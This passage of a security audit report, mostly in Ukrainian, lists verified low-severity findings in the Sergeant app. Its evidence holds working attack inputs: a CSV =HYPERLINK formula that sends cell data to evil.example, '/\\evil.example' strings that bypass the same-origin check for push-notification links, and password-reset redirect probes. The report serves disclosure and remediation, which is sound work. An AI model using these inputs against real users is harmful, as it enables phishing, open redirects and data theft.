Scripts are in <scratch>/agents/verify-client-static-infra-headers-ci-deps/. v8-pf.mjs (prod): `https://sergeant.com.ua /api/csp-report 200 ACAO= null`, `https://www.sergeant.com.ua ... ACAO= null`, `https://app.sergeant.com.ua ... ACAO= https://app.sergeant.com.ua`. www.sergeant.com.ua serves the same CSP and Reporting-Endpoints headers. v8-rep.mjs (Chromium 141, 150 s): the only request was `POST /uri-notallowed-urionly ct=application/csp-report`. Both pages with report-uri plus report-to sent nothing. v8-cdp*.mjs: Network.reportingApiReportAdded fired for both origins, but completedAttempts stayed 0 (environment limitation).
```

### [low] Сервер у проді довіряє схемі sergeant:// як redirect для reset/OAuth, хоча RN-застосунку немає: токен скидання може забрати будь-який застосунок, що зареєстрував цю схему

- **ID:** `client-static/landing-shell-mobile#5` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/server/src/auth.ts:641-652 (getTrustedNativeSchemes → у production ["sergeant://"]); apps/mobile/app/(auth)/forgot-password.tsx:35; apps/mobile/app.config.ts (scheme: "sergeant", custom scheme без верифікації)
- **Вплив:** Зловмисник ініціює скидання пароля жертви з redirectTo=sergeant://… Якщо на пристрої жертви стоїть шкідливий застосунок зі схемою sergeant:// і жертва клікає легітимний лист від Sergeant, токен скидання (а для OAuth-флоу й callback) приходить цьому застосунку. Наслідок: захоплення акаунта. Потрібні шкідливий застосунок і клік, тому ризик низький.
- **Що зробити:** Поки RN-клієнт не випущено, прибрати sergeant:// з trustedOrigins у проді (BETTER_AUTH_TRUSTED_NATIVE_SCHEMES=""). Для майбутнього релізу використовувати верифіковані App Links / Universal Links (https) для reset і OAuth замість custom scheme.

**Докази:**

```text
Локально (той самий код, що й у проді):
`POST /api/auth/request-password-reset {redirectTo:"https://evil.example.com/steal"} -> 403 INVALID_REDIRECT_URL`
`POST /api/auth/request-password-reset {redirectTo:"sergeant://reset-password"} -> 200 {"status":true,…}`
Кастомну схему на Android/iOS може заявити будь-який застосунок. Мобільний контур на паузі (ADR-0094), тож легітимного обробника sergeant:// на пристроях немає зовсім.
```

**Відтворення:**

```text
node <scratch>/agents/client-static-landing-shell-mobile/reset-redirect.mjs (власний pool-користувач, 2 запити)
```

**Верифікатор:**

```text
Відтворив локально на власному pool-користувачі. request-password-reset з redirectTo=https://evil.example.com/steal дає 403 INVALID_REDIRECT_URL, а з sergeant://reset-password дає 200. Схожі схеми sergeantx:// і sergeant:evil отримують 403, тобто збіг точний, але сама схема довірена. Далі взяв токен із таблиці verification і пройшов посилання з листа: GET /api/auth/reset-password/<token>?callbackURL=sergeant://reset-password -> 302 Location: sergeant://reset-password?token=<24 символи>. Отже, токен скидання справді передається тому, хто обробляє схему sergeant://. passwordResetMail використовує URL Better Auth без переписування. У проді getTrustedNativeSchemes() повертає ["sergeant://"], якщо не задано BETTER_AUTH_TRUSTED_NATIVE_SCHEMES; прод-env я не перевіряв. Коментар у коді називає це наміром («Always trusted»), але exp:// з тієї ж причини (схема не привʼязана до застосунку) з прода прибрали, а RN-застосунок, на який спирається цей намір, не випущено (ADR-0094). Severity лишаю low: атака потребує шкідливого застосунку на телефоні жертви і кліку по листу скидання, якого вона не запитувала.
```

**Додаткові докази верифікатора:**

```text
reset-redirect.mjs і reset-follow.mjs у <scratch>/agents/verify-client-static-landing-shell-mobile/. У проді не перевіряв: не хотів слати POST на прод-auth.
```

### [low] Release-білд Capacitor-shell нефункціональний: немає VITE_API_BASE_URL, а прод-CORS не пускає origin WebView; у APK потрапляють 24 МБ .map

- **ID:** `client-static/landing-shell-mobile#6` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Уже відстежується:** docs/work/specs/launch/phases/02-capacitor-launch.md (partial: CORS only, line 25)
- **Де:** apps/web/package.json:9 (build:capacitor без VITE_API_BASE_URL); .github/workflows/mobile-shell-android-release.yml (крок «Build web bundle», жодного VITE__/SENTRY__); mobile-shell-ios-release.yml; apps/web/src/shared/lib/api/apiUrl.ts:71-79; apps/web/src/core/auth/authClient.ts:10-16; apps/server/src/http/cors.ts:23-27; apps/mobile-shell/capacitor.config.ts:22 (webDir ../server/dist); apps/web/vite.config.js:317-319
- **Вплив:** Будь-який APK/IPA з release-воркфлоу не зможе залогінитись: запити йдуть на локальний asset-сервер WebView, а з явним base URL їх відріже CORS. Продукт на паузі (ADR-0094), тож це міна для майбутнього релізу. Плюс зайві 24 МБ у пакеті.
- **Що зробити:** У build:capacitor/воркфлоу вимагати VITE_API_BASE_URL (fail build, якщо порожній при VITE_TARGET=capacitor). Додати https://localhost і capacitor://localhost у ALLOWED_ORIGINS прод-сервера і в trustedOrigins Better Auth лише разом із релізом shell. Для capacitor-білду ставити sourcemap: false або видаляти *.map після білду.

**Докази:**

```text
apiUrl(): `return base ? `${base}${p}` : p;`, тобто без VITE_API_BASE_URL шлях відносний. getAuthBaseURL() → window.location.origin, а в shell це https://localhost (androidScheme https). Workflow: `run: pnpm --filter @sergeant/mobile-shell build:web` без env. Живий прод-CORS: `Origin: https://localhost -> ACAO=undefined`, `Origin: capacitor://localhost -> ACAO=undefined`. Sentry-плагін `disable: !process.env.SENTRY_AUTH_TOKEN`, тож filesToDeleteAfterUpload не спрацьовує: локальний dist має 405 файлів *.map (24 MB), і webDir пакує їх в APK.
```

**Відтворення:**

```text
Прочитати workflow і apiUrl.ts; node <scratch>/agents/client-static-landing-shell-mobile/cors-probe.mjs https://api.sergeant.com.ua/api/v1/me https://localhost capacitor://localhost; ls apps/server/dist/assets/*.map | wc -l
```

**Верифікатор:**

```text
Підтверджено кодом. Ні android-, ні ios-release workflow не задають VITE_API_BASE_URL: job-level env містить лише GRADLE_OPTS / IOS_*, крок build:web іде без env, а файлів apps/web/.env* у git немає. Тоді apiUrl() повертає відносний шлях, а getAuthBaseURL() бере window.location.origin, тобто запити йдуть на https://localhost у WebView. Прод-CORS для Origin https://localhost і capacitor://localhost дає ACAO=undefined (перевірив сам). vite build.sourcemap="hidden", а sentryVitePlugin вимкнено без SENTRY_AUTH_TOKEN, тож *.map лишаються в apps/server/dist, тобто у webDir: локально 405 файлів і 24M. Репо публічне, тож .map в APK дає лише зайвий розмір, без витоку. Мобільний контур на паузі (ADR-0094), тому це міна для майбутнього релізу без поточного впливу.
```

**Додаткові докази верифікатора:**

```text
Частково вже зафіксовано: docs/work/specs/launch/phases/02-capacitor-launch.md:25 має відкритий пункт «API доступний з com.sergeant.shell:// origin» про CORS. Відсутній VITE_API_BASE_URL і .map у пакеті там не згадані.
```

### [low] security.txt веде на неіснуючий старий репозиторій; SECURITY.md немає; на лендінгу security.txt відсутній

- **ID:** `client-static/landing-shell-mobile#8` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/web/public/.well-known/security.txt:1 (Contact), :5 (Canonical на мертвий домен); apps/landing/public/ (немає .well-known/security.txt)
- **Вплив:** Дослідник, що знайде вразливість (наприклад, CORS з першої знахідки), не має робочого каналу повідомлення. Репорт або загубиться, або піде в публічні issues.
- **Що зробити:** Оновити Contact на https://github.com/SkOrDs-02/sergeant/security/advisories/new (увімкнути Private vulnerability reporting) або на email. Прибрати Canonical на 2dmanager. Додати SECURITY.md і такий самий security.txt у apps/landing/public/.well-known/.

**Докази:**

```text
Прод: `Contact: https://github.com/Skords-01/Sergeant/security/advisories/new`. AGENTS.md: код живе в SkOrDs-02/sergeant, а github.com/Skords-01/Sergeant — «історія старого репо». GitHub search `repo:Skords-01/Sergeant` → total_count 0 (публічно не існує). `GET https://sergeant.com.ua/.well-known/security.txt -> 404`. У корені репо немає SECURITY.md.
```

**Відтворення:**

```text
BODY=600 node <scratch>/agents/client-static-landing-shell-mobile/hdrs.mjs https://app.sergeant.com.ua/.well-known/security.txt https://sergeant.com.ua/.well-known/security.txt
```

**Верифікатор:**

```text
Reproduced live, and the repo matches. `apps/web/public/.well-known/security.txt` has `Contact: https://github.com/Skords-01/Sergeant/security/advisories/new`, and prod (app.sergeant.com.ua and sergeant.vercel.app) serves it unchanged. That target is dead: the GitHub search `repo:Skords-01/Sergeant` returns total_count 0, and `user:Skords-01` fails with 'resources do not exist'. AGENTS.md also calls the old repo history (the archived remote is even named `deadgh-zaebal`). The live repo is SkOrDs-02/sergeant. One of the three Canonical hosts, sergeant.2dmanager.com.ua, also returns 502 'upstream dial failed', so it is dead. sergeant.com.ua/.well-known/security.txt returns 404, and `apps/landing/public/` has no `.well-known/`. There is no SECURITY.md at the repo root, in .github/ or in docs/. Nothing neutralizes this: docs/governance/security/beta-tester-brief.md:8 tells beta testers to report through the 2dmanager security.txt link, which is dead as well, and beta-security-readiness.md:51 assumes 'security.txt already points to GitHub Security Advisories'. So the documented disclosure channel is broken at every entry point. Low severity is fair: it is process/defense, not a vulnerability.
```

**Додаткові докази верифікатора:**

```text
Verifier probe (verify-client-static-landing-shell-mobile/hdrs.mjs): app.sergeant.com.ua/.well-known/security.txt 200 (Contact = Skords-01/Sergeant); sergeant.com.ua/.well-known/security.txt 404; sergeant.2dmanager.com.ua/.well-known/security.txt 502 'upstream dial failed'. GitHub search: repo:Skords-01/Sergeant total_count 0; user:Skords-01 gives a Validation Failed 'resources do not exist'; SkOrDs-02/sergeant is public. docs/governance/security/beta-tester-brief.md:8 links https://sergeant.2dmanager.com.ua/.well-known/security.txt. Expires 2026-12-31 is still valid.
```

### [low] Перевірку same-origin у notificationclick обходить `/\host`: пуш відкриває чужий сайт, а /api/v1/push/test дозволяє задати довільні url/title/body

- **ID:** `client-static/service-worker-pwa#4` · **Вердикт:** підтверджено · **Категорія:** `security` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Серйозність від шукача:** medium (переоцінено верифікатором)
- **Де:** apps/web/src/sw/pushPayload.ts:82-87; apps/web/src/sw.ts:84-108; packages/shared/src/schemas/api.ts:1336-1352; apps/server/src/modules/push/push.ts:388-397
- **Вплив:** Захисний контроль, задокументований як «без цієї перевірки нотифікація стає вектором фішингу», не працює. Разом із підпискою, що переживає logout, будь-який власник акаунта може слати фішингові пуші від імені Sergeant на пристрої, де він колись вмикав сповіщення.
- **Що зробити:** Валідувати через парсинг: `const u = new URL(raw, self.location.origin); return u.origin === self.location.origin ? u.pathname + u.search + u.hash : null;` і відкидати рядки з `\` чи керівними символами. На сервері обмежити url у PushTestRequestSchema відносним шляхом застосунку (regex ^/[A-Za-z0-9/_?=&amp;.-]*$) або allowlist-ом.

**Докази:**

```text
safeNotificationPath пропускає рядок, якщо він починається з одного `/` і не з `//`. WHATWG URL трактує `\` як `/` і вирізає \t/\n. urlcheck.mjs (дзеркало функції):
"/\\evil.example/x" accepted: true resolves to: https://evil.example/x
"/\t/evil.example/" accepted: true resolves to: https://evil.example/
"/\n/evil.example" accepted: true resolves to: https://evil.example/
Далі sw.ts: client.navigate(deepLink) для відкритої вкладки або clients.openWindow(url). PushTestRequestSchema: url: z.string().trim().min(1).max(2048) без обмежень; title ≤200, body ≤2000.
```

**Відтворення:**

```text
node <scratch>/agents/client-static-service-worker-pwa/urlcheck.mjs. Ланцюг (потрібен VAPID): зловмисник входить у свій акаунт на чужому/спільному браузері, вмикає пуші, виходить (підписка лишається, див. попередню знахідку); потім POST /api/v1/push/test {title:"Sergeant: сесія завершилась", body:"Увійди знову", url:"/\\evil.example/login"} → у жертви нотифікація від origin Sergeant; тап веде відкриту вкладку застосунку на evil.example.
```

**Верифікатор:**

```text
Обхід перевірки підтверджено в Chromium. safeNotificationPath (pushPayload.ts:82-87) пропускає "/\\evil.example/x", "/\t/evil.example/" і "/\n/evil.example", а браузерний WHATWG URL резолвить їх у https://evil.example/…. WindowClient.navigate і clients.openWindow дозволяють крос-origin URL, тож тап веде на чужий сайт. Сервер url не звужує: PushTestRequestSchema url = z.string().trim().min(1).max(2048), а trim прибирає лише краї. Severity знизив з medium до low. По-перше, VAPID-підписаний пуш може надіслати тільки сервер, а /push/test шле лише на пристрої самого викликача. Атака можлива, тільки якщо зловмисник раніше сам увімкнув пуші під своїм акаунтом у браузері жертви (див. #1). По-друге, такий зловмисник і так повністю контролює title/body нотифікації з origin Sergeant. Обхід додає лише редирект в один тап, тож це defense-in-depth дефект задокументованого контролю.
```

**Додаткові докази верифікатора:**

```text
v4-url.mjs (Chromium URL parser, base https://sergeant.example/sw.js):
"/\\evil.example/x" accepted: true → https://evil.example/x
"/\t/evil.example/" accepted: true → https://evil.example/
"/\n/evil.example" accepted: true → https://evil.example/
"//evil.example" accepted: false
Пушити довільний url може лише /api/push/test (requireSession, sendToUser(req.user.id)). /api/push/send internal-only (requireInternalIp + API_SECRET).
```

### [low] PlanSection.handleManage переходить на URL порталу від сервера без allowlist-перевірки, яку робить PricingPage

- **ID:** `client-static/web-route-guards#13` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/web/src/core/settings/PlanSection.tsx:118-127; порівняти apps/web/src/core/PricingPage.tsx:197-199,260-262
- **Вплив:** Defense-in-depth: компрометація/помилка конфігурації бекенду (або MITM на білінг-відповідь) дає open redirect з налаштувань, хоча на /pricing той самий вектор закрито.
- **Що зробити:** Використати `assertAllowedCheckoutUrl` і в PlanSection (бажано — спільний хелпер `openBillingPortal`).

**Докази:**

```text
PlanSection: `const portal = await billingApi.createPortal(); window.location.assign(portal.url);` PricingPage для того самого `createPortal()`: `const safeUrl = assertAllowedCheckoutUrl(url); window.location.assign(safeUrl);` (коментар «Audit F4: refuse to navigate if server returned a non-allowlisted host»).
```

**Відтворення:**

```text
Статичне порівняння двох викликів billingApi.createPortal().
```

**Верифікатор:**

```text
Підтверджено статично. PlanSection.handleManage (PlanSection.tsx:118-127) робить `window.location.assign(portal.url)` без перевірки. PricingPage для того самого billingApi.createPortal() викликає assertAllowedCheckoutUrl (PricingPage.tsx:259-262, коментар «Defense-in-depth open-redirect guard (audit F4)»). Zod-схема BillingPortalResponseSchema перевіряє лише `z.string().url()`, хост не обмежує, тож нижче захисту теж немає. Дизайн-спека налаштувань (2026-09-17-settings-design.md:315) стверджує, що «Редиректи на оплату — ALLOWED_CHECKOUT_HOSTS», а це для Settings неправда. Експлуатація потребує компрометації або помилки бекенду, тож це defense-in-depth, low.
```

**Додаткові докази верифікатора:**

```text
packages/shared/src/schemas/api.ts:1849-1852: `url: z.string().url()`. CSP script-src без 'unsafe-inline' гасить javascript:-варіант, лишається звичайний open redirect.
```

### [low] Креденшел PIN лишається після виходу, а «Змінити PIN» не питає старий PIN

- **ID:** `client-static/web-storage-session#12` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/web/src/core/security/lockStorage.ts:26-40,142-149; apps/web/src/core/security/useAppLock.ts:135-141; apps/web/src/core/security/AppLock.tsx:125-148; apps/web/src/core/auth/AuthContext.tsx:551-697
- **Вплив:** Залишкові дані після виходу. Хтось, хто на хвилину отримав розблокований пристрій, може змінити PIN без знання старого.
- **Що зробити:** Видаляти креденшел акаунта при виході. Для зміни чи вимкнення PIN вимагати поточний PIN.

**Докази:**

```text
`logout()` не викликає `clearPinHash`, тож IndexedDB `sergeant_app_lock` зберігає `v1:<userId>` (salt + PBKDF2-хеш 4-6-значного PIN) після виходу. Для числового PIN цей хеш офлайн перебирається за хвилини. `startChange()` одразу відкриває `PinSetupFlow`, який вводить новий PIN двічі без перевірки поточного.
```

**Відтворення:**

```text
Статично. Після виходу перевірити в DevTools IndexedDB `sergeant_app_lock`/`lock_cred`.
```

**Верифікатор:**

```text
Підтверджено в коді. logout() (AuthContext.tsx:551-697) не викликає clearPinHash. purgeAppOwnedLocalData (purgeLocalData.ts:125-141) чистить лише LS, kv warm-cache і RQ-снапшот, IDB `sergeant_app_lock` не чіпає. startChange (useAppLock.ts:135-141) одразу ставить state="change", і PinSetupFlow (AppLock.tsx:125+) двічі питає новий PIN без перевірки старого. disablePin теж вимагає лише діалог підтвердження. Ризик низький: PIN закриває тільки UI і дані не шифрує, а коментар у lockStorage.ts сам визнає, що офлайн-атакер має перевагу.
```

**Додаткові докази верифікатора:**

```text
Пошук по apps/web/src: clearPinHash викликається лише в useAppLock.ts:190 (disablePin). Попередній аудит 2026-08-08-profile-settings-deep-audit.md (L-6, L-11) цього не покриває.
```

### [low] CSV-експорт операцій Фініка не нейтралізує формули (=, +, -, @): formula injection в Excel/Sheets

- **ID:** `client-static/web-xss-injection#2` · **Вердикт:** підтверджено · **Категорія:** `injection` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Серйозність від шукача:** medium (переоцінено верифікатором)
- **Де:** apps/web/src/shared/lib/ui/export.ts:24-30 (arrayToCSV/escapeCSV); apps/web/src/modules/finyk/pages/transactions/exportTransactionsCsv.ts:110-150; порівняти з packages/shared/src/lib/exportCsv.ts:48-56
- **Вплив:** Опис операції приходить ззовні: мерчант у Monobank, назва магазину з фіскального чека (receipts/save.ts:197 `description: input.storeName`), імпортовані виписки, а підробити його можна й через `?sync=`. Такий опис стає активною формулою в таблиці людини. Сценарії: ексфільтрація сусідніх клітинок через HYPERLINK/WEBSERVICE і фішинг-клік. Саме цей експорт є єдиною видимою кнопкою CSV у фінансах.
- **Що зробити:** Перевести `arrayToCSV` на спільний `escapeCsvValue` з packages/shared або додати туди той самий захист. Розширити regex до `/^[=+\-@\t\r]/` (за потреби також `＝`, тобто повноширинне `=`). Для числової колонки суми префікс не застосовувати. Додати тест на `=HYPERLINK`.

**Докази:**

```text
`const escapeCSV = (value) => { const str = String(value ?? ""); if (str.includes(separator) || str.includes('"') || str.includes("\n")) return `"${str.replace(/"/g,'""')}"`; return str; }`: префікса `'` для `=+-@` немає, хоча `escapeCsvValue` у packages/shared його має ("Formula injection: … опис транзакції «=1+1»"). Спостерігалось: ручна витрата з назвою `=HYPERLINK("https://evil.example/?d="&A1,"Click")`, кнопка «Вивантажити операції у CSV», і у файлі finyk-2026-10.csv рядок `2026-10-01,23:51,"=HYPERLINK(""https://evil.example/?d=""&A1,""Click"")",-12.00,витрата,Інше`. Excel виконує квотовану клітинку як формулу. Крім того, `escapeCsvValue` у shared не покриває провідні `\t` і `\r` (OWASP).
```

**Відтворення:**

```text
<scratch>/agents/client-static-web-xss-injection/csv-inject.mjs: /finyk/transactions, далі «Додати», назва `=HYPERLINK(...)`, сума 12, зберегти, натиснути кнопку `aria-label^="Вивантажити операції у CSV"`. Результат у exported.csv.
```

**Верифікатор:**

```text
Підтверджено в коді: exportTransactionsCsv.ts імпортує exportToCSV з @shared/lib/ui/export, а той викликає arrayToCSV. Тамтешній escapeCSV (export.ts:24-30) лише квотує роздільник, лапки й \n, префікса ' для =+-@ немає. Спільний escapeCsvValue (packages/shared/src/lib/exportCsv.ts:48-56) цей захист має з явним коментарем про «=1+1», тож два CSV-шляхи в репо непослідовні. exported.csv оригінального агента містить формулу `"=HYPERLINK(""https://evil.example/?d=""&A1,""Click"")"`. Severity знижую до low. Найпростіше джерело опису — власна ручна витрата користувача, тобто self-injection. Описи Monobank і назви магазинів з чеків стороння людина контролює лише частково. Шлях через ?sync= сюди не веде, бо applyData не застосовує manualExpenses. Excel при кліку на HYPERLINK чи зовнішніх даних показує попередження, DDE за замовчуванням вимкнено. Лишається defense-in-depth.
```

**Додаткові докази верифікатора:**

```text
export.ts:181-188: `exportToCSV(...) { const csv = arrayToCSV(data, columns); ...}`. В export.ts і exportTransactionsCsv.ts немає жодної згадки formula/injection. Також підтверджено, що escapeCsvValue у shared не покриває провідні \t і \r (regex `/^[=+\-@]/`).
```

### [low] PlanSection редиректить на `portal.url` без allow-list, тоді як PricingPage для того самого portal URL перевіряє його

- **ID:** `client-static/web-xss-injection#4` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/web/src/core/settings/PlanSection.tsx:118-128; порівняти з apps/web/src/core/PricingPage.tsx:49-86, 259-262
- **Вплив:** Захист F4 обходиться через другий вхід у той самий портал («Керувати підпискою» в налаштуваннях). `location.assign` з `javascript:` виконує код в origin застосунку, і React 18 цього не блокує. Без компрометації бекенду прямого експлойта немає.
- **Що зробити:** Винести `assertAllowedCheckoutUrl` у shared-модуль і викликати його і в PlanSection.handleManage. Додати перевірку `protocol === "https:"`: зараз `http://checkout.stripe.com` теж проходить.

**Докази:**

```text
PlanSection.tsx:123 `const portal = await billingApi.createPortal(); window.location.assign(portal.url);`. PricingPage для тієї ж `createPortal()` робить `const safeUrl = assertAllowedCheckoutUrl(url); window.location.assign(safeUrl);` з коментарем «Defense-in-depth open-redirect guard (audit F4)… щоб контракт-дрифт чи компроментація бекенду не змогли перевести юзера на довільний origin».
```

**Відтворення:**

```text
Статично: порівняти два виклики createPortal(). Рядок `portal.url` з відповіді API потрапляє в `location.assign` без перевірки (сценарій контракт-дрифту або MITM на бекенді, як у F4).
```

**Верифікатор:**

```text
Підтверджено в коді. PlanSection.tsx:123 робить `window.location.assign(portal.url)` без assertAllowedCheckoutUrl, а PricingPage для тієї самої createPortal() цей гард (audit F4) викликає. Схема клієнта BillingPortalResponseSchema має `url: z.string().url()`, і zod 4.4.3 приймає `javascript:alert(document.domain)`, `data:text/html,...` та будь-який хост, тож валідація відповіді нічого не відсікає. Твердження про виконання `javascript:` у проді перебільшене: CSP у apps/web/vercel.json має `script-src 'self' 'wasm-unsafe-eval' ...` без 'unsafe-inline', а така політика блокує навігацію на javascript:-URL. Реальний наслідок — open redirect, і лише за компрометації або дрейфу бекенду. Знахідка про те, що `http://checkout.stripe.com` проходить allowlist (немає перевірки protocol), теж вірна. Severity low (defense-in-depth, обхід уже запровадженого F4-гарду).
```

**Додаткові докази верифікатора:**

```text
<scratch>/agents/verify-client-static-web-xss-injection/zodurl.mjs: `"javascript:alert(document.domain)" ACCEPTED`, `"http://checkout.stripe.com/x" ACCEPTED`, `"data:text/html,hi" ACCEPTED`. CSP: apps/web/vercel.json:46 `script-src 'self' 'wasm-unsafe-eval' https://*.posthog.com ...`, без unsafe-inline.
```

### [low] `safeNotificationPath` у сервіс-воркері пропускає `/\evil.example` і `/\t/evil.example`, тому тап по пушу відкриває чужий origin

- **ID:** `client-static/web-xss-injection#5` · **Вердикт:** підтверджено · **Категорія:** `injection` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/web/src/sw/pushPayload.ts:82-87; apps/web/src/sw.ts:65-110 (client.navigate / clients.openWindow)
- **Вплив:** Defense-in-depth. Якщо колись у `url` пушу потрапить бодай частково контрольоване значення (новий тип нагадування, deep-link на сутність користувача), тап по системному сповіщенню з брендом Sergeant відкриє фішинговий сайт.
- **Що зробити:** Валідувати так: `const u = new URL(raw, self.registration.scope); return u.origin === self.location.origin ? u.pathname + u.search + u.hash : null`. Відкидати також `\` і керівні символи. На сервері обмежити `PushTestRequestSchema.url` відносними шляхами.

**Докази:**

```text
`if (!raw.startsWith("/") || raw.startsWith("//")) return null; … return raw;`. Перевірено WHATWG-парсером: `new URL("/\\evil.example/x", "https://app/")` дає https://evil.example/x, і `"/\t/evil.example/x"` дає https://evil.example/x (таб вирізається, лишається `//`). Обидва рядки проходять перевірку. Далі `client.navigate(deepLink)` / `self.clients.openWindow(url)` ведуть на зовнішній сайт: cross-origin navigate спецом дозволений. Для порівняння, в AssistantMessageBody (`HREF_SAFE_RE`) кейс `/\` уже закрито.
```

**Відтворення:**

```text
node <scratch>/agents/client-static-web-xss-injection/urltest.mjs. Поточні джерела `data.url`: серверні константи (reminders/*.ts) і `POST /api/v1/push/test` (лише собі, `url: z.string()` без перевірки форми).
```

**Верифікатор:**

```text
Підтверджено. safeNotificationPath (apps/web/src/sw/pushPayload.ts:82-87) перевіряє лише startsWith('/') && !startsWith('//'). Рядки `/\evil.example/x`, `/\t/evil.example/x` і також `/\n/evil.example/x` проходять перевірку, а WHATWG-парсер резолвить їх у https://evil.example/x. sw.ts віддає їх у client.navigate() і clients.openWindow(), а обидва дозволяють cross-origin. Документ docs/engineering/architecture/notifications.md:97 обіцяє «лише same-origin шлях», тож реалізація не відповідає задокументованому інваріанту. Експлуатувати зараз нема як: усі серверні data.url константи (reminders/due.ts:146,193,232, budget.ts:160, nudge.ts:225), а /push/test шле лише собі. Severity low (defense-in-depth).
```

**Додаткові докази верифікатора:**

```text
<scratch>/agents/verify-client-static-web-xss-injection/urltest.mjs: `"/\\evil.example/x" passes: true -> https://evil.example/x`, `"/\t/evil.example/x" passes: true -> https://evil.example/x`, `"/\n/evil.example/x" passes: true -> https://evil.example/x`. Коментар у схемі PushTestRequestSchema (packages/shared/src/schemas/api.ts:1340-1344) прямо каже, що URL-валідація навмисно м'яка.
```

### [low] Silpo `cartUrl` з upstream рендериться в `href` без перевірки схеми (React 18 не блокує `javascript:`)

- **ID:** `client-static/web-xss-injection#6` · **Вердикт:** підтверджено · **Категорія:** `xss` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/web/src/modules/nutrition/components/SilpoCartSheet.tsx:327-336; apps/server/src/modules/silpo/cartNormalize.ts:302,372; packages/shared/src/schemas/silpo.ts:450
- **Вплив:** Сторонній upstream (Silpo API або його компрометація чи схемний дрейф) визначає посилання, по якому користувач тисне в застосунку. `javascript:` дав би XSS в origin застосунку, `https://phish` дав би фішинг з довірою Sergeant. Захист у глибину проти третьої сторони.
- **Що зробити:** На сервері `z.string().url()` плюс allow-list хостів Silpo (https). На клієнті перевіряти `new URL(cartUrl).protocol === "https:"` перед рендером. Загалом зробити спільний `safeExternalHref()` для всіх зовнішніх href.

**Докази:**

```text
Сервер: `checkoutWebLink: z.string().optional()` і далі `cartUrl: envelope.data.checkoutWebLink ?? null`. Схема: `cartUrl: z.string().nullable()`. Клієнт: `<a href={cart.cartUrl} target="_blank" rel="noopener noreferrer">`. apps/web використовує react ^18.3, а там `javascript:` у href дає лише warning у dev і виконується в prod.
```

**Відтворення:**

```text
Статично. Локально Silpo не налаштований (SILPO_ENABLED=false), живого upstream немає.
```

**Верифікатор:**

```text
Код підтверджено. Сервер бере `checkoutWebLink: z.string().optional()` і кладе його в `cartUrl: envelope.data.checkoutWebLink ?? null` (cartNormalize.ts:301,372), спільна схема має `cartUrl: z.string().nullable()` (silpo.ts:450), а SilpoCartSheet.tsx:327-336 рендерить `<a href={cart.cartUrl} target="_blank">` без перевірки схеми. apps/web на react ^18.3. Наслідок слабший, ніж описано. XSS через `javascript:` у проді блокує CSP (script-src без 'unsafe-inline'), до того ж посилання відкривається в новому вікні з noopener. Лишається фішинг-лінк, і лише за компрометації або дрейфу upstream Silpo. Defense-in-depth проти третьої сторони, low.
```

**Додаткові докази верифікатора:**

```text
Перевірено статично (Silpo локально вимкнено). CSP: apps/web/vercel.json:46.
```

### [low] Безпекові гейти визначають прод лише за NODE_ENV, тоді як boot-асерти ще й за APP_ENV=production

- **ID:** `server-static-redo/route-authz#10` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика сервера · повтор route-authz
- **Стан:** відкрито
- **Уже відстежується:** docs/work/specs/audits/security-comprehensive-2026-08-04.md
- **Де:** apps/server/src/env/env.ts:705-711 (isDeployedProduction: NODE_ENV або APP_ENV); apps/server/src/http/cors.ts:62-65 (DEV_ORIGINS localhost з credentials); apps/server/src/auth.ts:646-651, 663-669 (exp:// і localhost у trustedOrigins); apps/server/src/http/requireInternalIp.ts:221-222 (failClosed)
- **Вплив:** Деплой з APP_ENV=production без NODE_ENV=production (staging, ручний запуск dist, env.ts:~1040 прямо радить знімати NODE_ENV для no-Sentry прогону) проходить прод-асерти, але відкриває credentialed CORS і Better Auth trust для localhost:5173/4173/5000/8081, довіряє exp:// і робить IP-allowlist /api/push/send fail-open.
- **Що зробити:** Скрізь використовувати isDeployedProduction() замість прямого NODE_ENV === "production" (cors.ts, auth.ts getTrustedOrigins/getTrustedNativeSchemes, requireInternalIp, security.ts HSTS).

**Докази:**

```text
cors.ts: `process.env["NODE_ENV"] === "production" ? PROD_ORIGINS : [...PROD_ORIGINS, ...DEV_ORIGINS]`. Boot-перевірки (METRICS_TOKEN, VAPID тощо) вважають прод і за APP_ENV. Dockerfile.api:145,246 ставить NODE_ENV=production, тож поточний прод не уражений.
```

**Відтворення:**

```text
Статичний аналіз.
```

**Верифікатор:**

```text
Підтверджено в коді. isDeployedProduction() (env.ts:705-711) вважає продом і NODE_ENV=production, і APP_ENV=production, а boot-асерти через нього кидають помилку. Тести прямо описують форму 'Coolify (no NODE_ENV=production)' з APP_ENV=production (assertStartupEnv.test.ts:107, betterAuthEnv.test.ts:50). Решта безпекових гейтів дивиться лише на NODE_ENV: cors.ts:62-65 (DEV_ORIGINS localhost з ACAC=true), auth.ts:648 (exp://), auth.ts:671 (localhost у trustedOrigins), requireInternalIp.ts:187 (failClosed для /api/push/send), security.ts:91-94 (HSTS). Поточний прод не уражений: Dockerfile.api:145,246 ставить ENV NODE_ENV=production. Тому це латентна неузгодженість, low. Одне уточнення до знахідки: env.ts:1039 радить знімати NODE_ENV/APP_ENV обидва, а з обома знятими розбіжності немає, тож цей приклад сценарію не ілюструє. Проте кодова база сама вважає APP_ENV=production без NODE_ENV валідною прод-формою, і за такого запуску гейти розходяться саме так, як описано.
```

**Додаткові докази верифікатора:**

```text
